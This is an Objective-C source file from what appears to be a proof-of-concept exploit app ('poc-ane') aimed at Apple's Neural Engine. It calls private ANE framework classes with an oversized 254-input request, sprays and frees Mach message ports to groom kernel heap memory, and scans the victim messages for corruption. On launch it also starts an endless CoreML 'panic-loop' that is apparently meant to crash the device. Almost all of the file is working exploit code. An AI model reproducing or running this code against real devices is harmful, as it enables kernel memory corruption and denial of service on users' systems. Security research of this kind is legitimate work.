//
//  ViewController.m
//  poc-ane
//
//  Created by Владислав Шевченко on 22.06.2026.
//

#import "ViewController.h"

#import <CoreML/CoreML.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#include <dlfcn.h>
#include <dispatch/dispatch.h>
#include <math.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INPUT_COUNT 254
#define OUTPUT_COUNT 1
#define COREML_MODEL_NAME "XVRC27_254in_1out_addchain"
#define COREML_PANIC_LOOP_MAX_ITERATIONS 0
#define COREML_PANIC_LOOP_DELAY_USEC 25000
#define DRAIN_COUNT 2048
#define PAIR_COUNT 2048
#define PAYLOAD_SIZE 0xb80
#define MODEL_KEY "XVRC27/mach_msg_min/model.anehash"
#define ANE_FRAMEWORK_PATH "/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine"

@interface _ANEModel : NSObject
+ (id)modelAtURLWithSourceURL:(id)modelURL sourceURL:(id)sourceURL key:(id)key cacheURLIdentifier:(id)cacheURLIdentifier;
- (unsigned long long)programHandle;
- (id)getCacheURLIdentifier;
- (id)key;
@end

@interface _ANEClient : NSObject
+ (id)sharedConnection;
- (BOOL)compileModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doLoadModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doEvaluateDirectWithModel:(id)model options:(id)options request:(id)request qos:(unsigned)qos error:(NSError **)error;
@end

@interface _ANEIOSurfaceObject : NSObject
+ (id)objectWithIOSurface:(IOSurfaceRef)surface;
@end

@interface _ANERequest : NSObject
+ (id)requestWithInputs:(id)inputs inputIndices:(id)inputIndices outputs:(id)outputs outputIndices:(id)outputIndices procedureIndex:(id)procedureIndex;
- (BOOL)validate;
@end

typedef struct {
    mach_port_t hole;
    mach_port_t victim;
} pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[];
} inline_msg_t;

static void fail_mach(const char *what, kern_return_t kr) {
    fprintf(stderr, "%s: 0x%x %s\n", what, kr, mach_error_string(kr));
    exit(1);
}

static IOSurfaceRef make_surface(size_t size, uint8_t fill) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(size / 4),
        (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfaceBytesPerRow: @(size),
        (id)kIOSurfaceAllocSize: @(size)
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) {
        fprintf(stderr, "IOSurfaceCreate failed\n");
        exit(1);
    }
    IOSurfaceLock(s, 0, NULL);
    memset(IOSurfaceGetBaseAddress(s), fill, IOSurfaceGetAllocSize(s));
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }

    uint64_t magic = role ? 0x5649435458563237ULL : 0x484f4c4558563237ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, sizeof(magic));
    memcpy(p + 0x08, &index, sizeof(index));
    memcpy(p + 0x0c, &role, sizeof(role));
    memcpy(p + 0x10, &len, sizeof(len));
    memcpy(p + 0x18, &marker, sizeof(marker));
}

static mach_port_t make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        fail_mach("mach_port_allocate", kr);
    }
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fail_mach("mach_port_insert_right", kr);
    }
    return port;
}

static void send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) {
        abort();
    }

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58560000u | ((role & 0xffu) << 8) | (index & 0xffu));
    fill_payload(msg->bytes, index, role);

    kern_return_t kr = mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size,
                                0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    free(msg);
    if (kr != MACH_MSG_SUCCESS) {
        fail_mach("mach_msg send", kr);
    }
}

static kern_return_t recv_msg(mach_port_t port, uint8_t *payload) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) {
        abort();
    }

    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                (mach_msg_size_t)msg_size, port, 1000, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS && payload) {
        if (msg->hdr.msgh_size < sizeof(mach_msg_header_t) + PAYLOAD_SIZE) {
            kr = MACH_RCV_TOO_LARGE;
        } else {
            memcpy(payload, msg->bytes, PAYLOAD_SIZE);
        }
    }
    free(msg);
    return kr;
}

static void __attribute__((unused)) ensure_ane_framework_loaded(void) {
    if (NSClassFromString(@"_ANEModel") && NSClassFromString(@"_ANEClient")) {
        printf("[+] AppleNeuralEngine classes resolved from linked framework\n");
        return;
    }

    void *handle = dlopen(ANE_FRAMEWORK_PATH, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "dlopen AppleNeuralEngine failed: %s\n", dlerror());
        exit(1);
    }

    printf("[+] loaded AppleNeuralEngine=%p path=%s\n", handle, ANE_FRAMEWORK_PATH);
}

static NSString *find_bundled_model_path(void) {
    NSBundle *main_bundle = [NSBundle mainBundle];
    NSMutableArray<NSString *> *candidates = [NSMutableArray array];
    NSString *model_dir = [main_bundle pathForResource:@"model" ofType:nil];
    if (model_dir) {
        [candidates addObject:model_dir];
    }
    [candidates addObject:[main_bundle.resourcePath stringByAppendingPathComponent:@"model"]];
    [candidates addObject:main_bundle.resourcePath];

    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *candidate in candidates) {
        BOOL is_dir = NO;
        if (![fm fileExistsAtPath:candidate isDirectory:&is_dir] || !is_dir) {
            continue;
        }

        NSString *mil = [candidate stringByAppendingPathComponent:@"model.mil"];
        NSString *opts = [candidate stringByAppendingPathComponent:@"options.plist"];
        NSString *weights = [candidate stringByAppendingPathComponent:@"weights1.bin"];
        if ([fm fileExistsAtPath:mil] && [fm fileExistsAtPath:opts] && [fm fileExistsAtPath:weights]) {
            return candidate;
        }
    }

    return nil;
}

static id load_model(id *client_out) {

    Class model_cls = NSClassFromString(@"_ANEModel");
    Class client_cls = NSClassFromString(@"_ANEClient");
    if (!model_cls || !client_cls) {
        fprintf(stderr, "missing ANE classes\n");
        exit(1);
    }

    NSBundle *main_bundle = [NSBundle mainBundle];
    NSString *model_path = find_bundled_model_path();
    if (!model_path) {
        fprintf(stderr, "missing bundled model files under: %s\n", main_bundle.resourcePath.UTF8String);
        exit(1);
    }

    printf("[+] app bundle path=%s\n", main_bundle.bundlePath.UTF8String);
    printf("[+] model bundle path=%s\n", model_path.UTF8String);

    NSURL *model_url = [NSURL fileURLWithPath:model_path isDirectory:YES];
    NSString *key = [NSString stringWithUTF8String:MODEL_KEY];
    NSDictionary *opts = @{
        @"kANEFModelCacheIdentifierUsingSourceURLKey": @YES,
        @"kANEFCompilationInitiatedByE5MLKey": @YES,
        @"kANEFCompilerOptionsFilenameKey": @"options.plist",
        @"kANEFModelType": @"kANEFModelMIL",
        @"kANEFNetPlistFilenameKey": @"model.mil",
    };

    id client = [client_cls sharedConnection];
    id model = [model_cls modelAtURLWithSourceURL:model_url
                                        sourceURL:model_url
                                              key:key
                               cacheURLIdentifier:nil];

    NSError *err = nil;
    BOOL ok = [client compileModel:model options:opts qos:2 error:&err];
    printf("[+] compile ok=%d cache=%s\n", ok,
           [[[model getCacheURLIdentifier] description] UTF8String]);
    if (err) {
        fprintf(stderr, "compile error: %s\n", err.description.UTF8String);
        exit(1);
    }

    ok = [client doLoadModel:model options:opts qos:2 error:&err];
    printf("[+] load ok=%d handle=0x%llx\n", ok,
           (unsigned long long)[model programHandle]);
    if (err || [model programHandle] == 0) {
        fprintf(stderr, "load error: %s\n", err ? err.description.UTF8String : "zero handle");
        exit(1);
    }

    *client_out = client;
    return model;
}

static id make_request(void) {
    Class surf_cls = NSClassFromString(@"_ANEIOSurfaceObject");
    Class req_cls = NSClassFromString(@"_ANERequest");
    if (!surf_cls || !req_cls) {
        fprintf(stderr, "missing request classes\n");
        exit(1);
    }

    NSMutableArray *inputs = [NSMutableArray arrayWithCapacity:INPUT_COUNT];
    NSMutableArray *input_indices = [NSMutableArray arrayWithCapacity:INPUT_COUNT];
    NSMutableArray *outputs = [NSMutableArray arrayWithCapacity:OUTPUT_COUNT];
    NSMutableArray *output_indices = [NSMutableArray arrayWithCapacity:OUTPUT_COUNT];

    for (uint32_t i = 0; i < INPUT_COUNT; i++) {
        [inputs addObject:[surf_cls objectWithIOSurface:make_surface(602112, (uint8_t)(0x41 + (i & 0xf)))]];
        [input_indices addObject:@(i)];
    }
    for (uint32_t i = 0; i < OUTPUT_COUNT; i++) {
        [outputs addObject:[surf_cls objectWithIOSurface:make_surface(0x4000, 0x61)]];
        [output_indices addObject:@0];
    }

    id req = [req_cls requestWithInputs:inputs
                           inputIndices:input_indices
                                outputs:outputs
                          outputIndices:output_indices
                         procedureIndex:@0];
    printf("[+] request validate=%d inputs=%u outputs=%u\n",
           [req respondsToSelector:@selector(validate)] ? [req validate] : 0,
           INPUT_COUNT, OUTPUT_COUNT);
    return req;
}

static pair_t *spray(void) {
    mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
    pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
    if (!drain || !pairs) {
        abort();
    }

    printf("[+] drain live mach-msg=%u\n", DRAIN_COUNT);
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        drain[i] = make_port();
        send_msg(drain[i], i, 2);
    }

    printf("[+] spray mach-msg pairs=%u payload=0x%x\n", PAIR_COUNT, PAYLOAD_SIZE);
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        pairs[i].hole = make_port();
        pairs[i].victim = make_port();
        send_msg(pairs[i].hole, i, 0);
        send_msg(pairs[i].victim, i, 1);
    }

    printf("[+] free holes\n");
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        kern_return_t kr = recv_msg(pairs[i].hole, NULL);
        if (kr != MACH_MSG_SUCCESS) {
            fail_mach("mach_msg receive hole", kr);
        }
    }
    sync();
    return pairs;
}

static int scan(pair_t *pairs) {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];

    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        kern_return_t kr = recv_msg(pairs[i].victim, actual);
        if (kr != MACH_MSG_SUCCESS) {
            fprintf(stderr, "[!] victim %u receive: 0x%x %s\n", i, kr, mach_error_string(kr));
            continue;
        }

        fill_payload(expected, i, 1);
        size_t first = SIZE_MAX;
        size_t changed = 0;
        for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
            if (actual[j] != expected[j]) {
                if (first == SIZE_MAX) {
                    first = j;
                }
                changed++;
            }
        }

        if (first != SIZE_MAX) {
            printf("[+] HIT mach-msg victim=%u first_diff=0x%zx changed=%zu\n", i, first, changed);
            for (size_t off = first & ~(size_t)0xf; off < ((first & ~(size_t)0xf) + 0x40); off += 0x10) {
                printf("  %04zx:", off);
                for (size_t k = 0; k < 0x10; k++) {
                    printf(" %02x", actual[off + k]);
                }
                printf("\n");
            }
            return 0;
        }
    }

    printf("[-] no corrupted mach message found\n");
    return 2;
}

static NSURL *find_coreml_model_url(void) {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *model_name = [NSString stringWithUTF8String:COREML_MODEL_NAME];

    NSURL *compiled_url = [bundle URLForResource:model_name withExtension:@"mlmodelc"];
    if (compiled_url) {
        return compiled_url;
    }

    NSString *compiled_path = [bundle.resourcePath stringByAppendingPathComponent:
                               [model_name stringByAppendingPathExtension:@"mlmodelc"]];
    BOOL is_dir = NO;
    if ([[NSFileManager defaultManager] fileExistsAtPath:compiled_path isDirectory:&is_dir] && is_dir) {
        return [NSURL fileURLWithPath:compiled_path isDirectory:YES];
    }

    NSURL *source_url = [bundle URLForResource:model_name withExtension:@"mlmodel"];
    if (!source_url) {
        NSString *source_path = [bundle.resourcePath stringByAppendingPathComponent:
                                 [model_name stringByAppendingPathExtension:@"mlmodel"]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:source_path]) {
            source_url = [NSURL fileURLWithPath:source_path];
        }
    }
    if (!source_url) {
        return nil;
    }

    NSError *compile_error = nil;
    NSURL *runtime_compiled_url = [MLModel compileModelAtURL:source_url error:&compile_error];
    if (!runtime_compiled_url) {
        fprintf(stderr, "[-] CoreML compile failed: %s\n", compile_error.description.UTF8String);
        return nil;
    }

    return runtime_compiled_url;
}

static MLMultiArray *make_scalar_input(double value, NSError **error) {
    MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                     dataType:MLMultiArrayDataTypeDouble
                                                        error:error];
    if (!array) {
        return nil;
    }

    array[0] = @(value);
    return array;
}

static int run_coreml_inference(void) {
    @autoreleasepool {
        NSURL *model_url = find_coreml_model_url();
        if (!model_url) {
            fprintf(stderr, "[-] missing bundled %s.mlmodelc/.mlmodel under %s\n",
                    COREML_MODEL_NAME, [NSBundle mainBundle].resourcePath.UTF8String);
            return 1;
        }

        printf("[+] CoreML model URL=%s\n", model_url.path.UTF8String);

        NSError *err = nil;
        MLModelConfiguration *configuration = [MLModelConfiguration new];
        configuration.computeUnits = MLComputeUnitsAll;
        MLModel *model = [MLModel modelWithContentsOfURL:model_url
                                           configuration:configuration
                                                   error:&err];
        if (!model) {
            fprintf(stderr, "[-] MLModel load failed: %s\n", err.description.UTF8String);
            return 1;
        }

        NSMutableDictionary<NSString *, MLFeatureValue *> *features =
            [NSMutableDictionary dictionaryWithCapacity:INPUT_COUNT];
        double expected = 0.0;
        for (uint32_t i = 0; i < INPUT_COUNT; i++) {
            double value = (double)(i + 1);
            NSString *name = [NSString stringWithFormat:@"x_%03u", i];
            MLMultiArray *input = make_scalar_input(value, &err);
            if (!input) {
                fprintf(stderr, "[-] MLMultiArray create failed for %s: %s\n",
                        name.UTF8String, err.description.UTF8String);
                return 1;
            }

            features[name] = [MLFeatureValue featureValueWithMultiArray:input];
            expected += value;
        }

        MLDictionaryFeatureProvider *provider =
            [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
        if (!provider) {
            fprintf(stderr, "[-] feature provider failed: %s\n", err.description.UTF8String);
            return 1;
        }

        id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];
        if (!prediction) {
            fprintf(stderr, "[-] prediction failed: %s\n", err.description.UTF8String);
            return 1;
        }

        MLFeatureValue *output_value = [prediction featureValueForName:@"y"];
        MLMultiArray *output = output_value.multiArrayValue;
        if (!output) {
            fprintf(stderr, "[-] missing multiarray output y\n");
            return 1;
        }

        double got = [output[0] doubleValue];
        printf("[+] inference ok inputs=%u output y[0]=%.0f expected=%.0f\n",
               INPUT_COUNT, got, expected);
        return fabs(got - expected) < 0.001 ? 0 : 2;
    }
}

static void run_coreml_panic_loop(void) {
    uint64_t iteration = 0;

    for (;;) {
        @autoreleasepool {
            iteration++;
            printf("[+] CoreML panic-loop iteration=%llu\n",
                   (unsigned long long)iteration);
            fflush(stdout);

            int ret = run_coreml_inference();
            printf("[+] CoreML panic-loop iteration=%llu ret=%d\n",
                   (unsigned long long)iteration, ret);
            fflush(stdout);
            fflush(stderr);

            if (COREML_PANIC_LOOP_MAX_ITERATIONS != 0 &&
                iteration >= COREML_PANIC_LOOP_MAX_ITERATIONS) {
                printf("[+] CoreML panic-loop reached max iterations=%llu\n",
                       (unsigned long long)iteration);
                fflush(stdout);
                return;
            }
        }

        usleep(COREML_PANIC_LOOP_DELAY_USEC);
    }
}

int test(void) {
    @autoreleasepool {
        id client = nil;
        id model = load_model(&client);
        id request = make_request();
        pair_t *pairs = spray();

        NSError *err = nil;
        BOOL ok = [client doEvaluateDirectWithModel:model options:@{} request:request qos:2 error:&err];
        printf("[+] trigger ok=%d err=%s\n", ok, err ? err.description.UTF8String : "<nil>");

        int ret = scan(pairs);
        sync();
        return ret;
    }
}

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    static dispatch_once_t once;
    dispatch_once(&once, ^{
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);

        printf("[+] starting CoreML panic-loop model=%s inputs=%u outputs=%u delay_us=%u max=%u\n",
               COREML_MODEL_NAME, INPUT_COUNT, OUTPUT_COUNT,
               COREML_PANIC_LOOP_DELAY_USEC, COREML_PANIC_LOOP_MAX_ITERATIONS);

        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            run_coreml_panic_loop();
        });
    });
}


@end
